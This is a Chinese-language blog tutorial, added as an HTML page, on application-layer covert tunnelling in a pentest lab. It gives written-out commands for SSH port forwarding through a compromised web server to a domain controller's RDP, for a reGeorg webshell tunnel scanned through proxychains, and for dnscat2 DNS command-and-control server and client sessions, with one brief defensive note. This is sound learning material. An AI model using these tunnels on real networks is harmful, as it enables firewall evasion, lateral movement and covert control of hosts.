@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="应用层中的隧道技术主要利用软件提供的端口来发送数据，常用的隧道协议有 SSH、HTTP&#x2F;HTTPS 和 DNS   0x01 SSH协议&amp;emsp;在内网中，几乎所有的linux&#x2F;unix服务器和网络设备都支持SSH协议。在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其它网络建立的隧道。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="隐藏通信隧道技术之 应用层">
+<meta property="og:url" content="https://mayi077.github.io/2021/03/22/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8B-%E5%BA%94%E7%94%A8%E5%B1%82/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="应用层中的隧道技术主要利用软件提供的端口来发送数据，常用的隧道协议有 SSH、HTTP&#x2F;HTTPS 和 DNS   0x01 SSH协议&amp;emsp;在内网中，几乎所有的linux&#x2F;unix服务器和网络设备都支持SSH协议。在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其它网络建立的隧道。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1gordrhc8l2j31510k7na3.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bly1gorhv4o79jj31100l8aok.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1gorj4uv147j313b0ir7fj.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bly1gorvu0c5a2j30xl06l0ta.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bly1gorw0ls7dmj314t0edq6i.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/006Glg0Bly1gorw8zzs0qj30kk08m756.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bly1gorwjp7jtaj30rg0fx792.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1gosiayrs31j30ic0bq46z.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1gosw2g45f0j30zt0htn0o.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1gosw6pqyf9j30na0aagto.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bly1gosx3jgp53j30ug0jkq5q.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bly1gosx7u6re5j30vq0iawht.jpg">
+<meta property="article:published_time" content="2021-03-22T12:04:33.000Z">
+<meta property="article:modified_time" content="2021-03-22T12:05:43.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="内网学习">
+<meta property="article:tag" content="隧道技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1gordrhc8l2j31510k7na3.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2021/03/22/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8B-%E5%BA%94%E7%94%A8%E5%B1%82/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>隐藏通信隧道技术之 应用层 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2021/03/22/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8B-%E5%BA%94%E7%94%A8%E5%B1%82/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          隐藏通信隧道技术之 应用层
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-22 20:04:33 / 修改时间：20:05:43" itemprop="dateCreated datePublished" datetime="2021-03-22T20:04:33+08:00">2021-03-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">内网学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>应用层中的隧道技术主要利用软件提供的端口来发送数据，常用的隧道协议有 SSH、HTTP/HTTPS 和 DNS  </p>
+<h3 id="0x01-SSH协议"><a href="#0x01-SSH协议" class="headerlink" title="0x01 SSH协议"></a>0x01 SSH协议</h3><p>&emsp;在内网中，几乎所有的linux/unix服务器和网络设备都支持SSH协议。在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其它网络建立的隧道。攻击者通过ssh端口隧道突破防火墙后可以建立一些之前无法建立的TCP连接。<br>&emsp;一个普通的SSH命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>参见命令选项如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常见命令如下：</span><br><span class="line">    -C：压缩传输，提高传输速度</span><br><span class="line">    -f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">    -N：建立静默连接（建立了连接，但是看不到具体会话）</span><br><span class="line">    -g：允许远程主机连接本地用于转发的端口</span><br><span class="line">    -L：本地端口转发</span><br><span class="line">    -R：远程端口转发</span><br><span class="line">    -D: 动态转发（socks代理）</span><br><span class="line">    -P：指定SSH端口</span><br></pre></td></tr></table></figure>
+<p>其实不论是<code>-L</code> 还是 <code>-R</code> 他们的标准格式都是<code>ssh -g -L/-R 转发到的ip:转发到的端口:目标ip:目标端口</code>   前面的转发到的ip可以省略，<code>-L</code> 默认就是主机，<code>-R</code> 默认就是ssh连接的主机且只有主机本机可以连接如<code>127.0.0.1</code>这种地址（直接ip加端口无效，外部就无法直接使用这个隧道了） </p>
+<h4 id="1、本地转发"><a href="#1、本地转发" class="headerlink" title="1、本地转发"></a>1、本地转发</h4><p>实验环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击主机 vps（kali）：192.168.152.152</span><br><span class="line">内网：</span><br><span class="line">web服务器win7: 外网ip（192.168.152.7）内网ip（1.1.1.7）</span><br><span class="line">域控服务器winserve2012：1.1.1.3</span><br></pre></td></tr></table></figure>
+<ol>
+<li>首先我们给win7、winserve安装一个openssh，会自动开启22端口。</li>
+<li>随后给winserve开启远程桌面服务</li>
+<li>在kali中使用如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 1222:1.1.1.3:3389 win7@192.168.152.7</span><br></pre></td></tr></table></figure></li>
+<li>随后会要我们输入win7的密码，过后我们会发现kali在监听自己的<code>1222</code>端口了。</li>
+<li>我们使用rdesktop 去开启我们的远程桌面<code>rdesktop 0.0.0.0:1222</code><img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1gordrhc8l2j31510k7na3.jpg" alt=""></li>
+</ol>
+<p>我们来分析一下kali中执行的命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 1222（vps监听端口）:1.1.1.3（目标ip）:3389（目标端口） win7@192.168.152.7</span><br><span class="line">-C 是压缩传输，提搞速度</span><br><span class="line">-f 将ssh传输转入后台，不占用当前shell</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">以web服务器192.168.152.7为跳板，将1.1.1.3的3398映射到vps的1222端口</span><br><span class="line">就是说我们访问本地的1222端口，会通过ssh隧道发送给目标主机指定端口。</span><br></pre></td></tr></table></figure>
+<p>简单说说<code>-L -R -D</code>    </p>
+<ol>
+<li><code>-L</code>:就是在本地启动端口，把本地端口数据转发到远端。如上面例子，把本地端口转发给1.1.1.3:3389   </li>
+<li><code>-R</code>:让远端启动端口，把远端端口数据转发到本地。(待实践)</li>
+<li><code>- D</code>: 如在 HostA 的本地 1080 端口启动一个 socks5 服务，通过本地 socks5 代理的数据会通过 ssh 链接先发送给 HostB，再从 HostB 转发送给远程主机：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HostA$ ssh -D localhost:1080  HostB</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>那么在 HostA 上面，浏览器配置 socks5 代理为 127.0.0.1:1080，看网页时就能把数据通过 HostB 代理出去，类似 ss/ssr 版本，只不过用 ssh 来实现。</strong><br><a href="https://zhuanlan.zhihu.com/p/57477087" target="_blank" rel="noopener">【参考链接】</a></p>
+<h4 id="2、远程转发"><a href="#2、远程转发" class="headerlink" title="2、远程转发"></a>2、远程转发</h4><p>其实这里就是使用我们上面提到的 <code>-R</code>参数。还是上面的环境，这次我们利用远程转发来实现。<br>&emsp;我们的1.1.1.3(winserve2012)是可以访问kali的，我们利用这一点让目标主机winserve主动去连接kali。（应用程序的客户端和 SSH 的服务器位于 SSH 隧道的同一侧，而应用程序的服务器和 SSH 的客户端位于 SSH 隧道的另一侧。使用的是远程转发）<br>我们在winserve中使用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -gR 3307:1.1.1.3:3389 mayi@192.168.152.152</span><br><span class="line">意为，将1.1.1.3主机的3389转发到 192.168.152.152的3307端口。   </span><br><span class="line">当然这里的1.1.1.3也可以为任何1.1.1.3可以访问的到的主机。</span><br></pre></td></tr></table></figure>
+<p>这里我只用了 <code>-gR</code> 也可以像之前那样加 <code>-CfNg</code><br><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bly1gorhv4o79jj31100l8aok.jpg" alt=""></p>
+<p>&emsp;本地转发是将远程主机的某个端口数据转发到本地机器的指定端口。而远程转发则是在远程主机上监听一个端口，所有访问远程服务器的指定端口的数据都会通过ssh隧道传输到本地端口。   </p>
+<h4 id="3、动态转发"><a href="#3、动态转发" class="headerlink" title="3、动态转发"></a>3、动态转发</h4><p>也就是我们前面提到的 <code>-D</code> 参数。<br>如我们在kali中使用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 8888 win7@192.168.152.7</span><br><span class="line">它会把我们访问本机8888端口的数据转发给192.168.152.7所在主机然后防护</span><br></pre></td></tr></table></figure>
+<p>随后我们设置浏览器代理走本机的8888端口，它就会相当于在win7中访问的数据，我们利用这一点访问<code>1.1.1.1</code> 防火墙管理界面。<img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1gorj4uv147j313b0ir7fj.jpg" alt=""></p>
+<h4 id="4、预防SSH隧道攻击的思路"><a href="#4、预防SSH隧道攻击的思路" class="headerlink" title="4、预防SSH隧道攻击的思路"></a>4、预防SSH隧道攻击的思路</h4><p>在系统中配置SSH中配置远程管理白名单，在ACL(访问控制列表)中限制只有特定的IP地址才能连接SSH</p>
+<h3 id="0x02-HTTP-HTTPS-协议"><a href="#0x02-HTTP-HTTPS-协议" class="headerlink" title="0x02 HTTP/HTTPS 协议"></a>0x02 HTTP/HTTPS 协议</h3><p>&emsp;通过HTTP协议与代理服务器建立连接，把所有要传送的数据全部封装到HTTP协议里进行传送，协议中包含有要连接的远程主机的IP和端口，连接成功之后会返回给客户端200，表示验证通过。<br>&emsp;适用于内网主机的icmp、dns、tcp和udp协议等都不能出网，唯一的数据通道是webshell搭建正向代理。   </p>
+<p>&emsp;推荐Neo-reGeorg、reGeorg、abptts 三款工具。  </p>
+<p>接下来我们使用regeorg做实验：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">【下载地址】</a></p>
+<ol>
+<li>用centos做一个边界web服务器（外ip：192.168.152.150 内ip：1.1.1.100），然后我们将<code>tunnel.nosocket.php</code>上传到网站根目录。</li>
+<li>在kali中访问<code>http://192.168.152.150/tunnel.nosocket.php</code><img data-src="//tva4.sinaimg.cn/large/006Glg0Bly1gorvu0c5a2j30xl06l0ta.jpg" alt=""></li>
+<li>我们在kali中使用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http:&#x2F;&#x2F;192.168.152.150&#x2F;tunnel.nosocket.php -p 5555</span><br></pre></td></tr></table></figure>
+来开启连接代理配置。</li>
+<li>使用<code>netstat -antlp | grep &#39;5555&#39;</code> 发现已经开始监听了。<img data-src="//tva4.sinaimg.cn/large/006Glg0Bly1gorw0ls7dmj314t0edq6i.jpg" alt=""></li>
+<li>接着我们在kali中使用 <code>proxychains</code>代理<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>
+修改为如下：<img data-src="//tvax2.sinaimg.cn/large/006Glg0Bly1gorw8zzs0qj30kk08m756.jpg" alt=""><br>保存后直接使用如：<code>proxychains nmap  1.1.1.1</code>得到如下效果<img data-src="//tvax4.sinaimg.cn/large/006Glg0Bly1gorwjp7jtaj30rg0fx792.jpg" alt=""></li>
+</ol>
+<h3 id="0x03-DNS协议"><a href="#0x03-DNS协议" class="headerlink" title="0x03 DNS协议"></a>0x03 DNS协议</h3><p>&emsp;DNS协议是一种请求/应答协议，也是一种可以用于应用层的隧道技术。我们知道，一方面在网络世界中DNS是一种不可或缺的服务，而另一方面DNS本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，这也为DNS成为隐蔽通信创造了条件。</p>
+<h4 id="1、查看DNS的连通性"><a href="#1、查看DNS的连通性" class="headerlink" title="1、查看DNS的连通性"></a>1、查看DNS的连通性</h4><p>&emsp;首先我们需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是测试DNS的连通性。</p>
+<ol>
+<li>查看当前内部存在的域名及ip<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;resolv.conf | grep -v &#39;^#&#39;</span><br></pre></td></tr></table></figure></li>
+<li>查很快1 是否与内部dns通信<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup 域名</span><br><span class="line">注意这里如果是localdomain(通过dhcp方式获得的ip,上网方式为nat就会出现这种情况)不会返回结果，我们接着下一步测试即可</span><br></pre></td></tr></table></figure></li>
+<li>查询是否可以通过内部DNS服务器解析外部域名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>
+<img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1gosiayrs31j30ic0bq46z.jpg" alt=""><br>可以看到，能够通过内部dns服务器解析外部域名。这就意味着我们可以使用DNS隧道实现隐蔽通信。</li>
+</ol>
+<h4 id="2、dnscat2"><a href="#2、dnscat2" class="headerlink" title="2、dnscat2"></a>2、dnscat2</h4><p>&emsp;dnscat2是一款开源软件，他使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份认证。dnscat2的客户端是用C语言编写的，服务端是用ruby语言编写的。严格来讲dnscat2是一个命令与控制工具。   </p>
+<h5 id="1-、dnscat2隧道的两种模式"><a href="#1-、dnscat2隧道的两种模式" class="headerlink" title="(1)、dnscat2隧道的两种模式"></a>(1)、dnscat2隧道的两种模式</h5><ol>
+<li>直连模式：客户端直接向指定ip地址的dns服务器发起dns解析请求。</li>
+<li>中继模式：dns经过互联网的迭代解析，最后指向我们的DNS服务器。与直连模式相比，中继模式的速度较慢。   </li>
+</ol>
+<p>&emsp;如果目标内网放行所有的DNS请求，那么dnscat2会自动使用直连模式，在请求日志中所有的域名都是以dnscat开头，所以防火墙可以很容易将直连模式检测出来。<br>&emsp;如果目标内网对DNS有限制，我们可以使用dnscat2的中继模式，他会使用中继模式申请一个域名，并将允许dnscat2服务端的服务器指定为受信任的DNS服务器。</p>
+<h5 id="2-、dnscat2服务端的安装"><a href="#2-、dnscat2服务端的安装" class="headerlink" title="(2)、dnscat2服务端的安装"></a>(2)、dnscat2服务端的安装</h5><p>我们在vps服务器上安装dnscat2，因为是用ruby写的所以需要我们有ruby的允许环境，还需要gem依赖包。</p>
+<ol>
+<li>准备工作，安装ruby、gem等<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install gem</span><br><span class="line">apt install ruby-dev</span><br><span class="line">apt install libpq-dev</span><br><span class="line">apt install ruby-bundler</span><br></pre></td></tr></table></figure></li>
+<li>具体的安装，最新版dnscat2 需要 <code>ruby &gt;= 2.3.0</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">$ cd dnscat2&#x2F;server&#x2F;</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ bundle install</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h5 id="3-、服务端的安装"><a href="#3-、服务端的安装" class="headerlink" title="(3)、服务端的安装"></a>(3)、服务端的安装</h5><h6 id="Linux服务端安装"><a href="#Linux服务端安装" class="headerlink" title="Linux服务端安装"></a>Linux服务端安装</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">$ cd dnscat2&#x2F;client&#x2F;</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<h6 id="window服务端安装"><a href="#window服务端安装" class="headerlink" title="window服务端安装"></a>window服务端安装</h6><p>注意：自己编译只能用<code>VS 2008</code>或者我们直接去release下载：<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">【下载地址】</a></p>
+<h5 id="直连模式"><a href="#直连模式" class="headerlink" title="直连模式"></a>直连模式</h5><p>&emsp;直连模式是客户端直接向指定的ip地址dns服务器发起dns解析请求，所有我们还可以不需要自己申请域名。    </p>
+<h6 id="服务端运行"><a href="#服务端运行" class="headerlink" title="服务端运行"></a>服务端运行</h6><ol>
+<li><p>我们在vps上(自己的虚拟kali)运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb --dns host&#x3D;0.0.0.0,port&#x3D;53531 --secret&#x3D;qwer1234</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1gosw2g45f0j30zt0htn0o.jpg" alt=""></p>
+</li>
+<li><p>我们在客户机中执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dnscat --dns server&#x3D;192.168.152.152,port&#x3D;53531 --secret&#x3D;qwer1234</span><br></pre></td></tr></table></figure>
+<p>回显看到session被建立的字样，表示连接成功。<img data-src="//tva3.sinaimg.cn/large/006Glg0Bly1gosw6pqyf9j30na0aagto.jpg" alt=""></p>
+</li>
+<li><p>其实，我们在服务端监听的时候可以不设置<code>--secret</code>只要对应的客服端连接时也不加即可。</p>
+</li>
+</ol>
+<h5 id="中继模式"><a href="#中继模式" class="headerlink" title="中继模式"></a>中继模式</h5><p>&emsp;直连模式虽然快，但是容易被发现和拦截，因为它所有的域名都是以<code>dnscat2</code>开头。所以我们就可以用到我们的中继模（本人无）。<br>&emsp;首先域名服务器需要添加一个A记录，将域名指向一个ip。然后还需要一个NS记录，将子域名指定其他DNS服务器解析。</p>
+<h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby.&#x2F;dnscat2.rb abc.com --secret&#x3D;123456</span><br><span class="line">还有一种模式：</span><br><span class="line">sudo ruby.&#x2F;dnscat2.rb abc.com --secret&#x3D;123456 --security&#x3D;open --no-cache</span><br></pre></td></tr></table></figure>
+
+<h6 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --secret&#x3D;123456 abc.com</span><br></pre></td></tr></table></figure>
+
+<p>   具体的我也没实践，毕竟没有dns域名。</p>
+<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>&emsp;作为一款C&amp;C工具，在Client端连接上了以后，可以通过Server端执行一些命令对Client进行控制。<br>&emsp;DNSCAT使用window这个概念来标识不同的client，在服务端使用windows命令可以列举当前已连接上来的客户端。(当然session也还是可以列出的)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dnscat2&gt; session</span><br><span class="line">0 :: main [active]</span><br><span class="line">  crypto-debug :: Debug window for crypto stuff [*]</span><br><span class="line">  dns1 :: DNS Driver running on 0.0.0.0:53531 domains &#x3D;  [*]</span><br><span class="line">  1 :: command (localhost.localdomain) [encrypted, NOT verified] [*]</span><br></pre></td></tr></table></figure>
